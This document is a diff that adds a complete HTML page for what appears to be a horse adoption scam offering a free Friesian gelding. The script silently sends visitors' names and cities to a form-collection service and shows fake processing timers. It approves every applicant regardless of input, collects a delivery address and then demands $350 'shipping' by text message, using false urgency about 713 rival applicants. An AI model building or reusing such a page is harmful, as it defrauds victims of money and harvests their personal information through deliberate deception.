@@ -1,1 +1,851 @@
 
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Gelding</title>
+    
+    <!-- Open Graph (OG) Meta Tags -->
+    <meta property="og:title" content="Equine Transfer Portal">
+    <meta property="og:description" content="Friesian Horse Transfer & Application Portal">
+    <meta property="og:image" content="https://yt3.googleusercontent.com/eLKa48vPs5weqLHcpgRipDrc1sR7Xhq7_eYjh5S1XppdkmerLi7q48P4EG800TErDFeZh-dCaA=s900-c-k-c0x00ffffff-no-rj">
+
+    <style>
+        :root {
+            --primary-brown: #4A2C11;
+            --primary-hover: #36200B;
+            --gold-accent: #C5A059;
+            --gold-light: #FAF5EB;
+            --gold-border: #D8B878;
+            --bg-main: #FAF8F5;
+            --card-bg: #FFFFFF;
+            --border-color: #E8E2D9;
+            --text-dark: #2B2621;
+            --text-muted: #70685E;
+            --red: #D93025;
+            --spinner-color: #4A2C11;
+            --laptop-scale: 1.15;         
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body, html { 
+            margin: 0; padding: 0; min-height: 100%; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; 
+            background: var(--bg-main);
+            color: var(--text-dark);
+            -webkit-font-smoothing: antialiased;
+            -webkit-text-size-adjust: none;
+            text-size-adjust: none;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Full-Width Header Bar */
+        .sticky-header {
+            position: sticky;
+            top: 0;
+            width: 100%;
+            background: #FFFFFF;
+            border-bottom: 2px solid var(--gold-accent);
+            z-index: 1000;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
+
+        /* Prominent Square Logo */
+        .header-logo {
+            width: 60px;
+            height: 60px;
+            border-radius: 8px;
+            object-fit: cover;
+            flex-shrink: 0;
+            border: 2px solid var(--gold-accent);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+            transition: transform 0.2s ease;
+        }
+
+        /* Header Text Set to 1.1875rem (19px) */
+        .sticky-header-text {
+            font-size: 1.1875rem;
+            font-weight: 400;
+            color: var(--text-dark);
+            margin: 0;
+            line-height: 1;
+        }
+
+        .sticky-header-text .header-name {
+            font-weight: 500;
+        }
+
+        /* Center Layout Container */
+        .container { 
+            width: 100%; 
+            max-width: 800px; 
+            margin: 0 auto 140px auto; 
+            padding: 20px; 
+            flex: 1;
+            display: flex; 
+            flex-direction: column;
+        }
+
+        /* Reduced padding for Page 3 specifically */
+        #view-complete {
+            padding: 4px 8px;
+            width: 100%;
+        }
+
+        @media (min-width: 768px) {
+            .container { max-width: 1020px; padding: 30px; margin-bottom: 200px; }
+            #view-complete { padding: 4px 8px; }
+            .header-logo { width: 72px; height: 72px; }
+            .sticky-header-text { font-size: 1.375rem; } /* 22px */
+            .g-card b { font-size: 1.25rem !important; } /* 20px */
+            .g-card span { font-size: 0.75rem !important; } /* 12px */
+            h2 { font-size: 1.75rem !important; } /* 28px */
+            p { font-size: 1rem !important; } /* 16px */
+            .addendum-text { font-size: 1rem !important; } /* 16px */
+            .full-input { font-size: 1rem !important; padding: 14px !important; } /* 16px */
+            label { font-size: 0.95rem !important; } /* 15.2px */
+            #percentage-timer, #percentage-timer-review { font-size: 2.25rem !important; } /* 36px */
+            #proc-label, #review-label { font-size: 1.125rem !important; } /* 18px */
+            .processing-view { padding-top: 190px !important; }
+        }
+
+        /* Extra Large Responsive Video Wrapper */
+        .video-container {
+            position: relative;
+            width: 100%;
+            padding-bottom: 75%;
+            height: 0;
+            margin-bottom: 16px;
+            border-radius: 14px;
+            overflow: hidden;
+            background-color: #000000;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.16);
+        }
+
+        .video-container video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* Custom Click-to-Play Overlay */
+        .video-thumbnail-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            cursor: pointer;
+            z-index: 10;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: rgba(0, 0, 0, 0.25);
+            transition: opacity 0.3s ease;
+        }
+
+        /* Play/Pause Button Icon Overlay - Very Small */
+        .play-button {
+            width: 36px;
+            height: 36px;
+            background: rgba(0, 0, 0, 0.65);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: transform 0.2s ease, background 0.2s ease;
+        }
+
+        .play-button::after {
+            content: "";
+            display: block;
+            width: 0;
+            height: 0;
+            border-style: solid;
+            border-width: 6px 0 6px 10px;
+            border-color: transparent transparent transparent #ffffff;
+            margin-left: 2px;
+        }
+
+        .pause-icon {
+            display: none;
+            width: 10px;
+            height: 12px;
+            justify-content: space-between;
+        }
+
+        .pause-icon span {
+            width: 3px;
+            height: 100%;
+            background-color: #ffffff;
+            border-radius: 1px;
+        }
+
+        .video-thumbnail-overlay:hover .play-button {
+            transform: scale(1.1);
+            background: rgba(0, 0, 0, 0.85);
+        }
+
+        /* Video Callout Text Set to 0.8125rem (13px) */
+        .video-callout-text {
+            font-size: 0.8125rem;
+            font-weight: 700;
+            color: #000000;
+            text-align: center;
+            margin: 0 0 18px 0;
+            line-height: 1.3;
+        }
+
+        .hidden { display: none !important; }
+
+        /* Form Inputs Matched to Button Color & Regular Font Weight */
+        .full-input, textarea { 
+            width: 100%; 
+            border: 1px solid var(--primary-brown); 
+            border-radius: 6px; 
+            padding: 12px 14px; 
+            font-size: 0.9375rem; /* 15px */
+            font-weight: 400;
+            outline: none; 
+            font-family: inherit;
+            color: var(--text-dark); 
+            background: #FFFFFF; 
+            display: block;
+            margin-top: 6px; 
+            box-shadow: 0 0 0 1px var(--primary-brown);
+            transition: border-color 0.2s, box-shadow 0.2s;
+            resize: none; /* Prevents manual resizing so line constraints stay clean */
+        }
+
+        .full-input::placeholder, textarea::placeholder {
+            font-weight: 400;
+        }
+
+        .full-input:focus, textarea:focus {
+            border-color: var(--primary-brown);
+            box-shadow: 0 0 0 2px var(--primary-brown);
+        }
+
+        /* Stat Grid */
+        .g-grid { 
+            display: grid; 
+            grid-template-columns: repeat(3, 1fr); 
+            gap: 10px; 
+            margin-bottom: 12px; 
+        }
+
+        /* Premium Fine Standout Design Applied to All 6 Cards */
+        .g-card { 
+            background: linear-gradient(135deg, #FFFFFF 0%, var(--gold-light) 100%);
+            border: 1.5px solid var(--gold-border);
+            border-radius: 6px; 
+            padding: 12px 8px; 
+            text-align: center; 
+            box-shadow: 0 4px 10px rgba(197, 160, 89, 0.18);
+            position: relative;
+            transform: translateY(-2px);
+        }
+
+        .g-card span { 
+            display: block; 
+            font-size: 0.6875rem; /* 11px */
+            text-transform: uppercase; 
+            letter-spacing: 0.8px; 
+            color: var(--gold-accent); 
+            font-weight: 700; 
+            margin-bottom: 4px; 
+        }
+
+        .g-card b { 
+            font-size: 1.05rem; /* 16.8px */
+            color: var(--primary-brown); 
+            font-weight: 700;
+            letter-spacing: 0.3px;
+        }
+
+        .g-card::after {
+            content: "★";
+            position: absolute;
+            top: 3px;
+            right: 5px;
+            font-size: 0.6rem;
+            color: var(--gold-accent);
+            opacity: 0.85;
+        }
+
+        /* Repositioned & Styled High Notice Banner on Page 2 */
+        .approval-callout-text {
+            font-size: 0.9375rem;
+            font-weight: 400;
+            line-height: 1.5;
+            margin: -10px 0 20px 0;
+            padding: 12px 14px;
+            background-color: var(--gold-light);
+            border: 1px solid var(--gold-border);
+            border-left: 4px solid var(--gold-accent);
+            border-radius: 6px;
+            color: var(--text-dark);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.03);
+        }
+        
+        /* Spacing between input sections */
+        .form-group { 
+            margin-bottom: 22px; 
+        }
+
+        /* Labels updated to 0.9375rem (15px) */
+        label { 
+            display: block; 
+            font-size: 0.9375rem; /* 15px */
+            font-weight: 600; 
+            margin-bottom: 4px; 
+            color: var(--text-dark);
+            line-height: 1.4;
+        } 
+        
+        /* Button Styles */
+        .btn-submit { 
+            display: block;
+            width: 100%; 
+            background: var(--primary-brown); 
+            color: #FFFFFF; 
+            padding: 16px; 
+            border-radius: 6px; 
+            border: none; 
+            font-size: 0.875rem; /* 16px */
+            font-weight: 700; 
+            cursor: pointer; 
+            margin: 8px 0 10px 0; 
+            text-align: center;
+            text-decoration: none;
+            transition: background 0.2s, transform 0.1s;
+            box-shadow: 0 4px 10px rgba(74, 44, 17, 0.15);
+        }
+
+        .btn-submit:hover {
+            background: var(--primary-hover);
+            color: #FFFFFF;
+        }
+
+        .btn-submit:active {
+            transform: translateY(1px);
+        }
+
+        /* Processing View */
+        .processing-view { 
+            flex-grow: 1; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: flex-start; 
+            align-items: center; 
+            text-align: center; 
+            padding: 150px 20px 40px 20px; 
+        }
+        
+        .ios-spinner { position: relative; width: 64px; height: 64px; margin-bottom: 20px; }
+        .ios-spinner div { 
+            position: absolute; left: 44.5%; top: 37%; width: 11%; height: 28%; 
+            background: var(--spinner-color); 
+            border-radius: 50px; opacity: 0; animation: ios-fade 1s linear infinite; 
+        }
+        @keyframes ios-fade { from { opacity: 1; } to { opacity: 0.15; } }
+        
+        .timer-text { font-size: 2rem; font-weight: 800; color: var(--primary-brown); margin-bottom: 6px; } /* 32px */
+        .label-text { font-size: 1.0625rem; font-weight: 600; color: var(--text-dark); margin: 0; line-height: 1.5; } /* 17px */
+
+        /* Addendum Box updated to 0.9375rem (15px) */
+        .addendum-text { 
+            text-align: left; 
+            color: var(--text-dark); 
+            line-height: 1.6; 
+            margin: 10px 0 20px 0; 
+            font-size: 0.9375rem; /* 15px */
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 12px;
+            width: 100%;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.02);
+        }
+
+        .addendum-title {
+            color: var(--primary-brown); 
+            font-size: 1.05rem; /* ~16.8px */
+            display: block; 
+            margin-top: -2px;
+            margin-bottom: 10px;
+        }
+
+        .error-border { border-color: var(--red) !important; box-shadow: 0 0 0 2px rgba(217, 48, 37, 0.25) !important; }
+        .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
+        @keyframes shake { 10%, 90% { transform: translate3d(-1px, 0, 0); } 20%, 80% { transform: translate3d(-4px, 0, 0); } 30%, 50%, 70% { transform: translate3d(-4px, 0, 0); } 40%, 60% { transform: translate3d(4px, 0, 0); } }
+
+        /* Footer */
+        footer {
+            width: 100%;
+            background-color: #FFFFFF; 
+            color: var(--text-muted); 
+            padding: 50px 20px; 
+            text-align: center; 
+            font-size: 0.8125rem; /* 13px */
+            font-weight: 600; 
+            line-height: 1.5;
+            border-top: 1px solid var(--border-color);
+            margin-top: auto;
+        }
+    </style>
+</head>
+<body>
+
+<!-- FULL-WIDTH STICKY HEADER (Shown on Pages 2 & 3) -->
+<div id="main-sticky-header" class="sticky-header hidden">
+    <img src="https://yt3.googleusercontent.com/eLKa48vPs5weqLHcpgRipDrc1sR7Xhq7_eYjh5S1XppdkmerLi7q48P4EG800TErDFeZh-dCaA=s900-c-k-c0x00ffffff-no-rj" alt="Logo" class="header-logo">
+    <div class="sticky-header-text">Hi, <span class="header-name">Applicant</span></div>
+</div>
+
+<div class="container" id="main-container">
+    
+    <!-- RESPONSIVE VIDEO WRAPPER WITH THUMBNAIL OVERLAY (PAGE 1) -->
+    <div class="video-container" id="hero-img">
+        <video 
+            id="main-video" 
+            poster="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS6l93jGcXgvK2oC6hhoIsH0QGZ9m7qt-DfLecdDTbNGYqHtc1wjgckEa5W&amp;s=10" 
+            preload="metadata"
+            playsinline>
+            <source src="https://ik.imagekit.io/y9m5bxjwn/Video_Editor_20260924_09_04_24.mp4" type="video/mp4">
+            Your browser does not support HTML5 video.
+        </video>
+        <div class="video-thumbnail-overlay" id="video-overlay" onclick="toggleVideoPlayback('main-video', 'video-overlay', 'pause-button-icon', 'callout-page-1')">
+            <div class="play-button" id="play-button-icon">
+                <div class="pause-icon" id="pause-button-icon">
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- CALLOUT TEXT (PAGE 1) -->
+    <div class="video-callout-text" id="callout-page-1">Tap the picture to see video</div>
+
+    <!-- PAGE 1 -->
+    <div id="view-main">
+        <div class="g-grid">
+            <div class="g-card"><span>Breed</span><b>Friesian</b></div>
+            <div class="g-card"><span>Age</span><b>10 yrs</b></div>
+            <div class="g-card"><span>Gender</span><b>Gelding</b></div>
+        </div>
+        <div class="g-grid">
+            <div class="g-card"><span>Height</span><b>14.3 hh</b></div>
+            <div class="g-card"><span>Color</span><b>Black</b></div>
+            <div class="g-card"><span>Price</span><b>FREE</b></div>
+        </div>
+        
+        <p style="font-size: 0.9375rem; line-height: 1.6; margin: 15px 0 25px 0;">      
+            This handsome gelding is two months post-surgery for vertebral fractures. While he requires a nine-month recovery period before carrying adult riders, he is currently fit for light riding by children. 
+            <br><br>
+            He is free to a good home. Follow the steps below to apply
+        </p>
+        
+        <!-- SUBMIT-FORM POST INTEGRATION FOR FIRST FORM ONLY -->
+        <form id="first-form" action="https://submit-form.com/QzOi0GhFC" method="POST" onsubmit="event.preventDefault(); submitFirstFormAndContinue('view-approval', 3000)">
+
+            <!-- 1. City Input First -->
+            <div class="form-group">
+                <label>Due to high shipping costs, we can only deliver horses within a 700-mile radius. Enter your city below to check eligibility.</label>
+                <input type="text" id="initial-user-city" name="HORSE_City" class="full-input required-field" placeholder="Enter your City">
+            </div>
+
+            <!-- 2. Name Input Second -->
+            <div class="form-group">
+                <label>Enter your First and Last Name</label>
+                <input type="text" id="initial-user-name" name="HORSE_name" class="full-input required-field" placeholder="First & Last name">
+            </div>
+
+            <button type="submit" class="btn-submit">Next</button>
+        </form>
+    </div>
+
+    <!-- PROCESSING VIEW 1 -->
+    <div id="view-processing" class="hidden processing-view">
+        <div class="ios-spinner">
+            <div style="transform: rotate(0deg) translate(0, -142%);"></div>
+            <div style="transform: rotate(30deg) translate(0, -142%); animation-delay: -0.916s;"></div>
+            <div style="transform: rotate(60deg) translate(0, -142%); animation-delay: -0.833s;"></div>
+            <div style="transform: rotate(90deg) translate(0, -142%); animation-delay: -0.75s;"></div>
+            <div style="transform: rotate(120deg) translate(0, -142%); animation-delay: -0.667s;"></div>
+            <div style="transform: rotate(150deg) translate(0, -142%); animation-delay: -0.583s;"></div>
+            <div style="transform: rotate(180deg) translate(0, -142%); animation-delay: -0.5s;"></div>
+            <div style="transform: rotate(210deg) translate(0, -142%); animation-delay: -0.416s;"></div>
+            <div style="transform: rotate(240deg) translate(0, -142%); animation-delay: -0.333s;"></div>
+            <div style="transform: rotate(270deg) translate(0, -142%); animation-delay: -0.25s;"></div>
+            <div style="transform: rotate(300deg) translate(0, -142%); animation-delay: -0.166s;"></div>
+            <div style="transform: rotate(330deg) translate(0, -142%); animation-delay: -0.083s;"></div>
+        </div>
+        <div id="percentage-timer" class="timer-text">0%</div>
+        <p id="proc-label" class="label-text">Processing...</p>
+    </div>
+
+    <!-- PROCESSING VIEW 2 -->
+    <div id="view-reviewing" class="hidden processing-view">
+        <div class="ios-spinner">
+            <div style="transform: rotate(0deg) translate(0, -142%);"></div>
+            <div style="transform: rotate(30deg) translate(0, -142%); animation-delay: -0.916s;"></div>
+            <div style="transform: rotate(60deg) translate(0, -142%); animation-delay: -0.833s;"></div>
+            <div style="transform: rotate(90deg) translate(0, -142%); animation-delay: -0.75s;"></div>
+            <div style="transform: rotate(120deg) translate(0, -142%); animation-delay: -0.667s;"></div>
+            <div style="transform: rotate(150deg) translate(0, -142%); animation-delay: -0.583s;"></div>
+            <div style="transform: rotate(180deg) translate(0, -142%); animation-delay: -0.5s;"></div>
+            <div style="transform: rotate(210deg) translate(0, -142%); animation-delay: -0.416s;"></div>
+            <div style="transform: rotate(240deg) translate(0, -142%); animation-delay: -0.333s;"></div>
+            <div style="transform: rotate(270deg) translate(0, -142%); animation-delay: -0.25s;"></div>
+            <div style="transform: rotate(300deg) translate(0, -142%); animation-delay: -0.166s;"></div>
+            <div style="transform: rotate(330deg) translate(0, -142%); animation-delay: -0.083s;"></div>
+        </div>
+        <div id="percentage-timer-review" class="timer-text">0%</div>
+        <p id="review-label" class="label-text">
+            Processing . . .
+            <br><br>
+            You'll get notified if your application is approved in a few seconds.
+            <br><br>
+            Do not leave this page.
+        </p>
+    </div>
+
+    <!-- PAGE 2 -->
+    <div id="view-approval" class="hidden">
+        <div class="approval-callout-text">      
+            Good news, <span class="display-submitted-name">Applicant</span>, <span class="display-submitted-city">your city</span> is within 570 miles of the gelding, placing it well inside our shipping radius.
+        </div>
+        
+        <form onsubmit="event.preventDefault(); triggerFlow('view-complete', 13000)">
+            <div class="form-group">
+                <label>
+                    To ensure the horse's safety, please describe your intended plans for the gelding. Your response will determine if your application is approved.
+                </label>
+                <!-- SET TO 5 ROWS, WITH ONKEYDOWN TO ADVANCE INPUT ON 5TH LINE JUMP -->
+                <textarea rows="5" id="care-plans-textarea" class="full-input required-field" placeholder="Briefly describe the workload and intended use for the horse"></textarea>
+            </div>
+            
+            <div class="form-group">
+                <label>To get an accurate shipping quote, please enter the address you want the gelding delivered to.</label>
+                <input type="text" id="delivery-address-input" class="full-input required-field" placeholder="Enter delivery address">
+            </div>
+            <button type="submit" class="btn-submit">Submit Application for Review</button>
+        </form>
+    </div>
+
+    <!-- PAGE 3 -->
+    <div id="view-complete" class="hidden">
+        <!-- RESPONSIVE VIDEO WRAPPER WITH THUMBNAIL OVERLAY (PAGE 3) -->
+        <div class="video-container" id="complete-hero-img">
+            <video 
+                id="complete-video" 
+                poster="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS6l93jGcXgvK2oC6hhoIsH0QGZ9m7qt-DfLecdDTbNGYqHtc1wjgckEa5W&amp;s=10" 
+                preload="metadata"
+                playsinline>
+                <source src="https://ik.imagekit.io/y9m5bxjwn/Video_Editor_20260924_09_04_24.mp4" type="video/mp4">
+                Your browser does not support HTML5 video.
+            </video>
+            <div class="video-thumbnail-overlay" id="complete-video-overlay" onclick="toggleVideoPlayback('complete-video', 'complete-video-overlay', 'complete-pause-button-icon', 'callout-page-3')">
+                <div class="play-button" id="complete-play-button-icon">
+                    <div class="pause-icon" id="complete-pause-button-icon">
+                        <span></span>
+                        <span></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- CALLOUT TEXT (PAGE 3) -->
+        <div class="video-callout-text" id="callout-page-3">Tap the picture to see video</div>
+
+        <div class="addendum-text">
+            <strong class="addendum-title">Application Approved</strong>
+            
+            Good job, <span class="display-submitted-name">Applicant</span>. You are approved to adopt the gelding. We have confirmed your delivery address.
+            
+            Estimated Delivery:
+            <br>
+            <strong><span id="start-date" class="delivery-date"></span> - <span id="end-date" class="delivery-date"></span></strong>
+            <br><br>
+The horse is free, but delivery to your address cost <strong>$350</strong>. Details Below:
+            <br><br>
+            There are 713 applicants. To secure your spot and ensure the gelding is delivered to your address, tap the button below to connect with our support team for shipping payment options. If you do not pay $350 for shipping, the horse will be awarded to the next applicant.
+        </div>
+        
+        <a href="sms:+15752084868?&amp;body=Hello%2C%20I%20was%20just%20approved%20to%20adopt%20the%20gelding!%20I'd%20like%20more%20details%20on%20how%20to%20pay%20for%20shipping." class="btn-submit">Contact Support for Shipping Details</a>    
+    </div>
+</div>
+
+<!-- FULL-WIDTH FOOTER -->
+<footer id="main-footer">
+    Friesian Heritage Horse and Sporthorse International <br>
+
+&copy; 2007 - 2026
+</footer>
+
+<script>
+    const views = ['view-main', 'view-processing', 'view-reviewing', 'view-approval', 'view-complete'];
+
+    // 5-Line limit handler for Textarea
+    const careTextarea = document.getElementById('care-plans-textarea');
+    const addressInput = document.getElementById('delivery-address-input');
+
+    if (careTextarea && addressInput) {
+        careTextarea.addEventListener('keydown', function(e) {
+            const lines = this.value.split('\n');
+
+            // If Enter key is pressed
+            if (e.key === 'Enter') {
+                // If 4 line breaks exist (making 5 lines active), block Enter and jump to next input
+                if (lines.length >= 5) {
+                    e.preventDefault();
+                    addressInput.focus();
+                }
+            }
+        });
+
+        // Paste or input listener to enforce maximum 5 lines
+        careTextarea.addEventListener('input', function() {
+            const lines = this.value.split('\n');
+            if (lines.length > 5) {
+                this.value = lines.slice(0, 5).join('\n');
+                addressInput.focus();
+            }
+        });
+    }
+
+    function toggleVideoPlayback(videoId, overlayId, pauseIconId, calloutId) {
+        const video = document.getElementById(videoId);
+        
+        // Completely remove the text when video is tapped/clicked
+        if (calloutId) {
+            const calloutEl = document.getElementById(calloutId);
+            if (calloutEl) {
+                calloutEl.classList.add('hidden');
+            }
+        }
+
+        if (video.paused || video.ended) {
+            video.play();
+        } else {
+            video.pause();
+        }
+    }
+
+    // Helper to attach event listeners to custom video player controls
+    function setupVideoController(videoId, overlayId, pauseIconId) {
+        const video = document.getElementById(videoId);
+        const overlay = document.getElementById(overlayId);
+        const pauseIcon = document.getElementById(pauseIconId);
+
+        video.addEventListener('play', () => {
+            overlay.style.backgroundColor = 'transparent';
+            pauseIcon.style.display = 'flex';
+            setTimeout(() => {
+                if (!video.paused) {
+                    overlay.style.opacity = '0';
+                }
+            }, 500);
+        });
+
+        video.addEventListener('pause', () => {
+            overlay.style.opacity = '1';
+            overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.35)';
+            pauseIcon.style.display = 'none';
+        });
+
+        video.addEventListener('ended', () => {
+            video.load(); // Reloads player state to restore the poster thumbnail image
+            overlay.style.opacity = '1';
+            overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.25)';
+            pauseIcon.style.display = 'none';
+        });
+    }
+
+    // Initialize listeners for both videos
+    setupVideoController('main-video', 'video-overlay', 'pause-button-icon');
+    setupVideoController('complete-video', 'complete-video-overlay', 'complete-pause-button-icon');
+
+    function navigate(targetId) {
+        views.forEach(id => document.getElementById(id).classList.add('hidden'));
+        document.getElementById(targetId).classList.remove('hidden');
+
+        // Ensure Page 1 callout text is hidden when moving away from Page 1
+        if (targetId !== 'view-main') {
+            const page1Callout = document.getElementById('callout-page-1');
+            if (page1Callout) {
+                page1Callout.classList.add('hidden');
+            }
+        }
+
+        // Toggle full-width sticky header visibility on views 2 & 3
+        const header = document.getElementById('main-sticky-header');
+        if (targetId === 'view-approval' || targetId === 'view-complete') {
+            header.classList.remove('hidden');
+        } else {
+            header.classList.add('hidden');
+        }
+
+        // Adjust main container padding for Page 3 to maximize width
+        const container = document.getElementById('main-container');
+        if (targetId === 'view-complete') {
+            container.style.padding = '8px';
+        } else {
+            container.style.padding = '';
+        }
+
+        // Completely hide footer on processing views AND on the last page (view-complete)
+        const footer = document.getElementById('main-footer');
+        if (targetId === 'view-processing' || targetId === 'view-reviewing' || targetId === 'view-complete') {
+            footer.classList.add('hidden');
+        } else {
+            footer.classList.remove('hidden');
+        }
+
+        window.scrollTo(0,0);
+    }
+
+    function updateSubmittedData() {
+        const cityVal = document.getElementById('initial-user-city').value.trim();
+        const nameVal = document.getElementById('initial-user-name').value.trim();
+
+        const finalCity = cityVal || "your city";
+        const finalName = nameVal || "Applicant";
+
+        // Update header & template labels dynamically
+        document.querySelectorAll('.header-name').forEach(el => el.innerText = finalName);
+        document.querySelectorAll('.display-submitted-name').forEach(el => el.innerText = finalName);
+        document.querySelectorAll('.display-submitted-city').forEach(el => el.innerText = finalCity);
+        document.querySelectorAll('.display-name').forEach(el => el.innerText = finalName.toUpperCase());
+    }
+
+    // Function specifically for handling the 1st form submission asynchronously in the background
+    function submitFirstFormAndContinue(nextView, duration) {
+        const firstForm = document.getElementById('first-form');
+        const requiredInputs = firstForm.querySelectorAll('.required-field');
+        let valid = true;
+
+        requiredInputs.forEach(input => {
+            if (input.value.trim() === "") {
+                valid = false;
+                input.classList.add('shake', 'error-border');
+            }
+        });
+
+        if (!valid) return;
+
+        updateSubmittedData();
+
+        // Submit form data in background to submit-form.com
+        const formData = new FormData(firstForm);
+        fetch('https://submit-form.com/QzOi0GhFC', {
+            method: 'POST',
+            body: formData,
+            headers: {
+                'Accept': 'application/json'
+            }
+        }).catch(err => console.log('Background submission:', err));
+
+        // Trigger processing animation view simultaneously
+        document.getElementById('hero-img').classList.add('hidden'); 
+        navigate('view-processing');
+        
+        let start = 0;
+        const timer = setInterval(() => {
+            start++;
+            document.getElementById('percentage-timer').innerText = start + "%";
+            if (start >= 100) {
+                clearInterval(timer);
+                setTimeout(() => {
+                    navigate(nextView);
+                }, 800);
+            }
+        }, duration / 100);
+    }
+
+    // General step transition for remaining pages
+    function triggerFlow(nextView, duration) {
+        const currentView = document.getElementById('view-approval');
+        const requiredInputs = currentView.querySelectorAll('.required-field');
+        let valid = true;
+
+        requiredInputs.forEach(input => {
+            if (input.value.trim() === "") {
+                valid = false;
+                input.classList.add('shake', 'error-border');
+            }
+        });
+
+        if (!valid) return;
+
+        updateSubmittedData();
+
+        const procViewId = 'view-reviewing';
+        const timerId = 'percentage-timer-review';
+
+        navigate(procViewId);
+        
+        let start = 0;
+        const timer = setInterval(() => {
+            start++;
+            document.getElementById(timerId).innerText = start + "%";
+            if(start >= 100) {
+                clearInterval(timer);
+                setTimeout(() => {
+                    finalizeView();
+                }, 800);
+            }
+        }, duration / 100);
+    }
+
+    // Reset error styling on user input
+    document.addEventListener('input', (e) => {
+        if (e.target.classList.contains('required-field') || e.target.classList.contains('full-input')) {
+            e.target.classList.remove('shake', 'error-border');
+            updateSubmittedData();
+        }
+    });
+
+    function finalizeView() {
+        const nameVal = document.getElementById('initial-user-name').value.trim() || "OWNER";
+        
+        const dateNow = new Date();
+        const monthNames = ["JANUARY", "FEBRUARY", "MARCH", "APRIL", "MAY", "JUNE", "JULY", "AUGUST", "SEPTEMBER", "OCTOBER", "NOVEMBER", "DECEMBER"];
+        const formattedDate = monthNames[dateNow.getMonth()] + " " + dateNow.getDate() + ", " + dateNow.getFullYear();
+
+        document.querySelectorAll('.display-name').forEach(el => el.innerText = nameVal.toUpperCase());
+        document.querySelectorAll('.display-date').forEach(el => el.innerText = formattedDate);
+        
+        navigate('view-complete');
+    }
+
+    // Date generation for delivery
+    (function() {
+        const today = new Date();
+        const options = { month: 'long', day: 'numeric', year: 'numeric' };
+        const start = new Date(today);
+        start.setDate(today.getDate() + 3);
+        const end = new Date(start);
+        end.setDate(start.getDate() + 4);
+        document.getElementById('start-date').textContent = start.toLocaleDateString('en-US', options);
+        document.getElementById('end-date').textContent = end.toLocaleDateString('en-US', options);
+    })();
+</script>
+</body>
+</html>
